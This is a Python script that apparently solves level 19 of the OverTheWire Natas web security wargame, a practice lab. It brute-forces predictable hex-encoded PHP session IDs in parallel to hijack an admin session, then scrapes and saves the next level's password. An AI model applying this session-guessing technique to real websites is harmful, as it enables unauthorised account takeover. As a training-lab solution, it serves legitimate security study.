import requests
import re
from natas_utility import *
import html
import codecs
import time
from joblib import Parallel, delayed
import multiprocessing

current_level = 19
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

data = {'username': 'admin',
        'password': 'password',
        'submit': 'submit'}


def process_req(i):
    session = requests.session()
    php_sess_id = codecs.encode((str(i)+'-admin').encode('utf-8'), 'hex').decode('utf-8')
    cookies = {'PHPSESSID': php_sess_id}

    response = session.post(url, data=data, auth=auth, cookies=cookies)
    content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')

    if 'Password' in content:
        password_regex = re.compile(r'Password: (.+)</pre>')
        return password_regex.findall(content)[0]
    else:
        return ''


now = time.time()
inputs = range(0, 641)
num_cores = multiprocessing.cpu_count()
full_results = Parallel(n_jobs=num_cores)(delayed(process_req)(j) for j in inputs)

next_password = ''.join(full_results)

print('found {} in {} seconds'.format(next_password, time.time() - now))

save_credentials(current_level + 1, next_password)
